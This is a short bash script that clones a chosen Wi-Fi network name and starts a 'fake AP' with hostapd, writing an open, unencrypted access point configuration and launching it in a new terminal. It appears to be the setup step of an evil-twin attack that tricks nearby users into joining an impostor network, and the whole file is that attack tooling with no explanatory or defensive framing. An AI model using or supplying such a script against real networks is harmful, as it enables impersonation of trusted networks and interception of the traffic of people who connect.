#!/bin/bash

read -p "Enter SSID to clone: " ssid
read -p "Enter interface for AP (e.g. wlan1): " iface

cat > hostapd.conf <<EOF
interface=$iface
driver=nl80211
ssid=$ssid
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

echo "[*] Starting fake AP..."
gnome-terminal -- bash -c "hostapd hostapd.conf"

